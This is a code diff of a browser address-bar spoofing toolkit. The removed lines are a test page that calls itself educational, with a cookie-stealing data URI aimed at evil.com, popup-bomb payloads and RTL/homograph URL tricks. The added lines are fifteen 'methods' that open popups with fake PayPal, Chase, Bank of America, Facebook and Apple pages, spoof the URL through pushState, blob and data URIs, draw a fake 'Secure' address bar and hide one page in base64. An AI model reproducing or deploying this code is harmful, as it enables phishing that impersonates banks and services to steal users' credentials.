-        let w = window.open("javascript:alert('XSS test - MODERN BROWSER BLOCK THIS')", "_blank");
-        trackWindow(w, "JS Basic");
-        addLog("Modern browsers block or warn about javascript: URLs", 'error');
-    }
-    
-    function testJSRedirect() {
-        let w = window.open("javascript:setInterval(()=>{window.location='javascript:alert(1)'},100)", "_blank");
-        trackWindow(w, "JS Redirect Loop");
-    }
-    
-    function testJSDocWrite() {
-        let w = window.open("javascript:document.write('<h1>PWNED</h1>')", "_blank");
-        trackWindow(w, "JS Document Write");
-    }
-    
-    function testJSDataSteal() {
-        let w = window.open("javascript:fetch('https://httpbin.org/get').then(r=>r.json()).then(d=>alert(JSON.stringify(d)))", "_blank");
-        trackWindow(w, "JS Data Steal Attempt");
-    }
-    
-    // ============ DATA URI ============
-    function testDataURIHTML() {
-        let w = window.open("data:text/html,<html><body><h1>DATA URI TEST</h1><script>alert('Data URI still works')</script></body></html>", "_blank");
-        trackWindow(w, "Data URI HTML");
-    }
-    
-    function testDataURIBase64() {
-        let html = btoa("<html><body><h1>Base64 Data URI</h1><script>alert(1)</script></body></html>");
-        let w = window.open(`data:text/html;base64,${html}`, "_blank");
-        trackWindow(w, "Data URI Base64");
-    }
-    
-    function testDataURIXSS() {
-        let w = window.open("data:text/html,<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>", "_blank");
-        trackWindow(w, "Data URI XSS Attempt");
-    }
-    
-    // ============ HISTORY API ============
-    function testPushStateSpoof() {
-        let w = window.open("about:blank", "_blank");
-        w.document.write("<h1>History Spoof Test</h1><p>Check address bar</p>");
-        setTimeout(() => {
-            try {
-                w.history.pushState({}, "", "https://google.com");
-                addLog("PushState to google.com - Address bar changed!", 'success');
-            } catch(e) {
-                addLog(`PushState failed: ${e.message}`, 'error');
-            }
-        }, 1000);
-        trackWindow(w, "PushState Spoof");
-    }
-    
-    function testReplaceStateSpoof() {
-        let w = window.open("about:blank", "_blank");
-        w.document.write("<h1>ReplaceState Test</h1>");
-        setTimeout(() => {
-            try {
-                w.history.replaceState({}, "", "/secure/banking");
-                addLog("ReplaceState to /secure/banking", 'info');
-            } catch(e) {}
-        }, 1000);
-        trackWindow(w, "ReplaceState");
-    }
-    
-    function testRapidPushState() {
-        let w = window.open("about:blank", "_blank");
-        w.document.write("<h1>Rapid PushState</h1>");
-        for(let i = 0; i < 50; i++) {
-            setTimeout(() => {
-                try {
-                    w.history.pushState({}, "", `/page${i}`);
-                } catch(e) {}
-            }, i * 100);
-        }
-        addLog("Rapid pushstate - mencoba overflow history", 'info');
-        trackWindow(w, "Rapid PushState");
-    }
-    
-    // ============ ABOUT:BLANK ============
-    function testAboutBlankFragment() {
-        let w = window.open("about:blank#something", "_blank");
-        trackWindow(w, "About Blank Fragment");
-    }
-    
-    function testAboutBlankParams() {
-        let w = window.open("about:blank?param=value&test=123", "_blank");
-        trackWindow(w, "About Blank Params");
-    }
-    
-    function testAboutBlankWithIframe() {
-        let w = window.open("about:blank", "_blank");
-        w.document.write(`
-            <iframe src="https://google.com" style="width:100%;height:100%"></iframe>
-            <script>
+
+            // METHOD 1: Original Base64 Method
+            window.method1_base64 = function() {
+                window.currentTechnique = "Base64 Obfuscation + Interval Redirect";
+                var evilPage = 'PGh0bWw+Cjx0aXRsZT5nb29nbGUuY29tPC90aXRsZT4KPHN0eWxlPmJvZHl7Zm9udC1mYW1pbHk6QWxpYW47YmFja2dyb3VuZDpsaW5lYXItZ3JhZGllbnQoMTM1ZGVnLCNjYzMzZmYsIzAwNjZmZik7Y29sb3I6d2hpdGU7dGV4dC1hbGlnbjpjZW50ZXI7cGFkZGluZzo1MHB4O30uc3Bvb2Z7YmFja2dyb3VuZDpyZ2JhKDAsMCwwLDAuOCk7Ym9yZGVyLXJhZGl1czoxNXB4O3BhZGRpbmc6MzBweDttYXgtd2lkdGg6NTAwcHg7bWFyZ2luOmF1dG87fTwvc3R5bGU+Cjxib2R5Pgo8ZGl2IGNsYXNzPSJzcG9vZiI+CjxoMT5BZGRyZXNzIEJhciBTcG9vZmVkITwvaDE+CjxwPllvdSB0aGluayB5b3UncmUgb246IDxzdHJvbmc+Z29vZ2xlLmNvbTwvc3Ryb25nPjwvcD4KPHA+VGVjaG5pcXVlOiBCYXNlNjQgRW5jb2Rpbmc8L3A+CjwvZGl2Pgo8L2JvZHk+CjwvaHRtbD4=';
+                var x = window.open('', '_blank', 'width=800,height=600');
+                setInterval(function() {
+                    try {
+                        x.location.replace('https://www.google.com:8080');
+                    } catch(e) {}
+                }, 100);
+                x.document.write(atob(evilPage));
+            };
+
+            // METHOD 2: Data URI Scheme
+            window.method2_dataURI = function() {
+                window.currentTechnique = "Data URI Scheme";
+                var fakeHTML = getFakePage("https://www.paypal.com");
+                var dataURI = 'data:text/html,' + encodeURIComponent(fakeHTML);
+                var win = window.open(dataURI, '_blank', 'width=800,height=600');
                 setTimeout(() => {
                     try {
-                        alert(iframe.contentDocument.cookie);
-                    } catch(e) {
-                        console.log('Cross-origin blocked');
-                    }
+                        win.document.title = "PayPal - Secure Payment";
+                    } catch(e) {}
+                }, 500);
+            };
+
+            // METHOD 3: About:Blank Hijacking
+            window.method3_aboutBlank = function() {
+                window.currentTechnique = "About:Blank + History.pushState";
+                var win = window.open('about:blank', '_blank', 'width=800,height=600');
+                win.document.write(getFakePage("https://www.facebook.com"));
+                win.document.close();
+                
+                // Push fake state
+                setTimeout(() => {
+                    try {
+                        win.history.pushState({}, "Facebook", "https://www.facebook.com/login");
+                        win.location.hash = "secure";
+                    } catch(e) {}
+                }, 100);
+            };
+
+            // METHOD 4: Pop-under Delayed Redirect
+            window.method4_popunder = function() {
+                window.currentTechnique = "Pop-under + Delayed Redirect";
+                var win = window.open('', '_blank', 'width=800,height=600');
+                win.document.write(getFakePage("https://www.amazon.com"));
+                
+                setTimeout(() => {
+                    try {
+                        win.location.replace('https://www.amazon.com:8443');
+                    } catch(e) {}
                 }, 2000);
-            <\/script>
-        `);
-        trackWindow(w, "About Blank Iframe");
-    }
-    
-    // ============ RTL OVERRIDE ============
-    function testRTLBasic() {
-        let rtlChar = "\u202E";
-        let url = `https://${rtlChar}elgoog.com`;
-        addLog(`Testing RTL override: ${escape(url)}`, 'info');
-        let w = window.open(url, "_blank");
-        trackWindow(w, "RTL Basic");
-    }
-    
-    function testRTLComplex() {
-        let url = "https://\u202Emoc.elgoog\u202E.com";
-        addLog(`Testing complex RTL: ${url}`, 'info');
-        let w = window.open(url, "_blank");
-        trackWindow(w, "RTL Complex");
-    }
-    
-    function testRTLPDF() {
-        let w = window.open("about:blank", "_blank");
-        w.document.write(`
-            <html dir="rtl">
-            <body>
-                <h1>RTL Page</h1>
-                <p>https://\u202Emoc.elgoog.com</p>
-            </body>
-            </html>
-        `);
-        trackWindow(w, "RTL PDF Style");
-    }
-    
-    // ============ UNICODE OVERFLOW ============
-    function testUnicodeMax() {
-        let unicodeStr = "";
-        for(let i = 0xFFFF; i > 0xFFF0; i--) {
-            unicodeStr += String.fromCharCode(i);
-        }
-        let url = `https://${unicodeStr}.com`;
-        addLog(`Testing max unicode characters`, 'info');
-        let w = window.open(url, "_blank");
-        trackWindow(w, "Unicode Max");
-    }
-    
-    function testEmojiOverload() {
-        let emojis = "😀😁😂🤣😃😄😅😆😉😊".repeat(100);
-        let url = `https://${emojis}.com`;
-        addLog(`Testing emoji overload: ${emojis.length} chars`, 'info');
-        let w = window.open(url, "_blank");
-        trackWindow(w, "Emoji Overload");
-    }
-    
-    function testCombiningChars() {
-        let combining = "a\u0300\u0301\u0302\u0303\u0304\u0305\u0306\u0307\u0308".repeat(50);
-        let url = `https://${combining}.com`;
-        addLog(`Testing combining characters`, 'info');
-        let w = window.open(url, "_blank");
-        trackWindow(w, "Combining Chars");
-    }
-    
-    // ============ POPUP CHAIN ============
-    function testPopupChain() {
-        let w1 = window.open("about:blank", "_blank");
-        let w2 = window.open("about:blank", "_blank");
-        let w3 = window.open("about:blank", "_blank");
-        addLog(`Opened 3 popups in chain`, 'info');
-        trackWindow(w1, "Chain 1");
-        trackWindow(w2, "Chain 2");
-        trackWindow(w3, "Chain 3");
-    }
-    
-    function testRecursivePopup() {
-        function recursivePopup(depth) {
-            if(depth > 10) return;
-            let w = window.open("about:blank", "_blank");
-            w.document.write(`<h3>Depth: ${depth}</h3><button onclick="window.opener.recursivePopup(${depth+1})">Next</button>`);
-            trackWindow(w, `Recursive ${depth}`);
-        }
-        recursivePopup(1);
-        addLog(`Starting recursive popup chain`, 'info');
-    }
-    
-    function testPopupLoop() {
-        for(let i = 0; i < 20; i++) {
-            setTimeout(() => {
-                let w = window.open("about:blank", "_blank");
-                trackWindow(w, `Loop ${i}`);
-            }, i * 100);
-        }
-        addLog(`Creating 20 popups in loop`, 'info');
-    }
-    
-    // ============ CUSTOM ============
-    function executeCustom() {
-        let url = document.getElementById('customURL').value;
-        if(!url) {
-            addLog("Masukkan URL terlebih dahulu!", 'error');
-            return;
-        }
-        addLog(`Custom execution: ${url}`, 'info');
-        let w = window.open(url, "_blank");
-        trackWindow(w, "Custom");
-    }
-    
-    function generateAbsurdPayload() {
-        const absurdPayloads = [
-            "https://😀😁😂🤣😃😄😅.com",
-            "javascript:for(i=0;i<100;i++){window.open('about:blank')}",
-            "https://google.com%00%00%00%00%00%00%00@evil.com",
-            "about:blank#" + "F".repeat(50000),
-            "data:text/html,<script>for(i=0;i<100;i++){window.open(location.href)}</script>",
-            "https://\u202E\u202E\u202E\u202E\u202E.com",
-            "javascript:document.body.innerHTML='<iframe src=https://google.com>'",
-            "https://" + "а".repeat(1000) + ".com",
-            "view-source:javascript:alert(1)",
-            "chrome://kill" // Old chromium feature
-        ];
-        let random = absurdPayloads[Math.floor(Math.random() * absurdPayloads.length)];
-        document.getElementById('customURL').value = random;
-        addLog(`Generated absurd payload: ${random}`, 'info');
-    }
-    
-    function openAllTests() {
-        addLog("⚠️ Opening ALL tests - This may freeze your browser!", 'error');
-        addLog("Starting all tests...", 'info');
-        
-        let tests = [
-            testNullByteSimple, testNullByteMultiple, testNullByteUnicode,
-            testPunycodeApple, testPunycodeGoogle, testPunycodePaypal,
-            testZeroWidthZWSP, testZeroWidthZWNJ, testZeroWidthZWJ,
-            testCRLFSingle, testCRLFDouble, testCRLFHeader,
-            testTabNabbingBasic, testLongURL50k, testChromeScheme,
-            testJSBasic, testDataURIHTML, testPushStateSpoof,
-            testAboutBlankFragment, testRTLBasic, testUnicodeMax,
-            testEmojiOverload, testPopupChain, testRecursivePopup
-        ];
-        
-        tests.forEach((test, i) => {
-            setTimeout(() => {
-                try {
-                    test();
-                    addLog(`Auto test ${i+1}/${tests.length} executed`, 'info');
-                } catch(e) {
-                    addLog(`Test ${i+1} failed: ${e.message}`, 'error');
+            };
+
+            // METHOD 5: JavaScript URI Scheme
+            window.method5_javascriptURI = function() {
+                window.currentTechnique = "JavaScript URI Scheme";
+                var jsURI = 'javascript:document.write(`' + getFakePage("https://www.microsoft.com") + '`);void(0);';
+                var win = window.open(jsURI, '_blank', 'width=800,height=600');
+            };
+
+            // METHOD 6: iframe Sandbox Escape
+            window.method6_iframe = function() {
+                window.currentTechnique = "iframe Sandbox Escape";
+                var iframeHTML = `<iframe sandbox="allow-same-origin allow-scripts allow-popups allow-forms" 
+                    srcdoc="${encodeURIComponent(getFakePage("https://www.apple.com"))}" 
+                    style="width:100%;height:100%;border:none;"></iframe>`;
+                var win = window.open('', '_blank', 'width=800,height=600');
+                win.document.write(iframeHTML);
+                win.document.title = "Apple ID";
+            };
+
+            // METHOD 7: History.pushState API
+            window.method7_pushState = function() {
+                window.currentTechnique = "History.pushState Spoofing";
+                var win = window.open('about:blank', '_blank', 'width=800,height=600');
+                win.document.write(getFakePage("https://www.chase.com"));
+                win.document.close();
+                
+                // Multiple pushState for deeper spoofing
+                win.history.pushState({}, "Chase", "https://www.chase.com/secure");
+                win.history.pushState({}, "Chase", "https://www.chase.com/secure/banking");
+                win.history.replaceState({}, "Chase", "https://www.chase.com");
+            };
+
+            // METHOD 8: Window Name Propagation
+            window.method8_windowName = function() {
+                window.currentTechnique = "Window Name Propagation";
+                var win = window.open('', '_blank', 'width=800,height=600');
+                win.name = "https://www.bankofamerica.com";
+                win.document.write(getFakePage("https://www.bankofamerica.com"));
+                
+                // Propagate to child windows
+                var child = win.open('', 'child');
+                if(child) {
+                    child.document.write(getFakePage("https://www.bankofamerica.com/secure"));
                 }
-            }, i * 500);
-        });
-    }
-    
-    addLog("🔬 Address Bar Spoofing Tester Ready", 'success');
-    addLog("⚠️ PERINGATAN: Semua teknik sudah PATCHED di browser modern", 'error');
-    addLog("📌 Gunakan untuk EDUKASI dan TESTING di environment sendiri", 'info');
-</script>
-</body>
+            };
+
+            // METHOD 9: Meta Refresh Timing Attack
+            window.method9_metaRefresh = function() {
+                window.currentTechnique = "Meta Refresh Timing Attack";
+                var fakeWithMeta = `<!DOCTYPE html>
+                <html>
+                <head>
+                    <meta http-equiv="refresh" content="0; url=https://www.google.com:8443">
+                    <title>Google</title>
+                </head>
+                <body>
+                    ${getFakePage("https://www.google.com")}
+                    <script>
+                        setTimeout(() => {
+                            document.title = "Google Search";
+                        }, 100);
+                    <\/script>
+                </body>
+                </html>`;
+                
+                var win = window.open('', '_blank', 'width=800,height=600');
+                win.document.write(fakeWithMeta);
+            };
+
+            // METHOD 10: Blob URL Spoofing
+            window.method10_blob = function() {
+                window.currentTechnique = "Blob URL Spoofing";
+                var blob = new Blob([getFakePage("https://www.twitter.com")], {type: 'text/html'});
+                var blobURL = URL.createObjectURL(blob);
+                var win = window.open(blobURL, '_blank', 'width=800,height=600');
+                
+                setTimeout(() => {
+                    URL.revokeObjectURL(blobURL);
+                }, 1000);
+            };
+
+            // METHOD 11: PostMessage Hijacking
+            window.method11_postMessage = function() {
+                window.currentTechnique = "PostMessage Hijacking";
+                var win = window.open('', '_blank', 'width=800,height=600');
+                win.document.write(getFakePage("https://www.instagram.com"));
+                
+                // Hijack postMessage
+                window.addEventListener('message', function(e) {
+                    if(e.origin === 'https://www.instagram.com') {
+                        win.postMessage({type: 'spoof', url: 'https://www.instagram.com'}, '*');
+                    }
+                });
+                
+                win.postMessage({type: 'init'}, '*');
+            };
+
+            // METHOD 12: Double Redirect Chain
+            window.method12_doubleRedirect = function() {
+                window.currentTechnique = "Double Redirect Chain";
+                var win = window.open('', '_blank', 'width=800,height=600');
+                
+                // First redirect
+                win.location = 'about:blank';
+                setTimeout(() => {
+                    win.document.write(getFakePage("https://www.linkedin.com"));
+                    // Second redirect after delay
+                    setTimeout(() => {
+                        try {
+                            win.location.replace('https://www.linkedin.com:8080');
+                        } catch(e) {}
+                    }, 1000);
+                }, 500);
+            };
+
+            // METHOD 13: Service Worker Interception
+            window.method13_serviceWorker = function() {
+                window.currentTechnique = "Service Worker Interception";
+                var win = window.open('', '_blank', 'width=800,height=600');
+                win.document.write(getFakePage("https://www.netflix.com"));
+                
+                // Register service worker if supported
+                if('serviceWorker' in win.navigator) {
+                    var swCode = `self.addEventListener('fetch', event => {
+                        event.respondWith(
+                            new Response('<html><body>Intercepted!</body></html>', {
+                                headers: {'Content-Type': 'text/html'}
+                            })
+                        );
+                    });`;
+                    
+                    var blob = new Blob([swCode], {type: 'application/javascript'});
+                    var swURL = URL.createObjectURL(blob);
+                    win.navigator.serviceWorker.register(swURL).then(() => {
+                        URL.revokeObjectURL(swURL);
+                    });
+                }
+            };
+
+            // METHOD 14: DOM Clobbering Attack
+            window.method14_domClobber = function() {
+                window.currentTechnique = "DOM Clobbering";
+                var clobberHTML = `<!DOCTYPE html>
+                <html>
+                <head><title>Document</title></head>
+                <body>
+                    <form name="location"></form>
+                    <form name="document"></form>
+                    ${getFakePage("https://www.github.com")}
+                    <script>
+                        // Clobber location object
+                        window.location.href = "https://www.github.com";
+                    <\/script>
+                </body>
+                </html>`;
+                
+                var win = window.open('', '_blank', 'width=800,height=600');
+                win.document.write(clobberHTML);
+            };
+
+            // METHOD 15: XSS Fake Address Bar
+            window.method15_xssFake = function() {
+                window.currentTechnique = "XSS Fake Address Bar";
+                var fakeBarHTML = `<!DOCTYPE html>
+                <html>
+                <head>
+                    <title>Google Chrome</title>
+                    <style>
+                        .fake-address-bar {
+                            position: fixed;
+                            top: 0;
+                            left: 0;
+                            right: 0;
+                            background: #f1f3f4;
+                            padding: 8px;
+                            font-family: monospace;
+                            z-index: 9999;
+                            border-bottom: 1px solid #ddd;
+                        }
+                        .fake-url {
+                            background: white;
+                            padding: 6px 12px;
+                            border-radius: 20px;
+                            margin: 0 10px;
+                            color: #202124;
+                        }
+                        .real-content {
+                            margin-top: 50px;
+                        }
+                    </style>
+                </head>
+                <body>
+                    <div class="fake-address-bar">
+                        <span>🔒 Secure | </span>
+                        <span class="fake-url">https://www.paypal.com/signin</span>
+                        <span> ⭐ ☆ 📌</span>
+                    </div>
+                    <div class="real-content">
+                        ${getFakePage("Fake Address Bar Demo")}
+                    </div>
+                    <script>
+                        // Disable actual address bar interactions
+                        window.addEventListener('beforeunload', function(e) {
+                            e.preventDefault();
+                            return false;
+                        });
+                    <\/script>
+                </body>
+                </html>`;
+                
+                var win = window.open('', '_blank', 'width=800,height=600');
+                win.document.write(fakeBarHTML);
+                win.document.title = "PayPal - Secure Payment";
+            };
+        </script>
+    </body>
 </html>
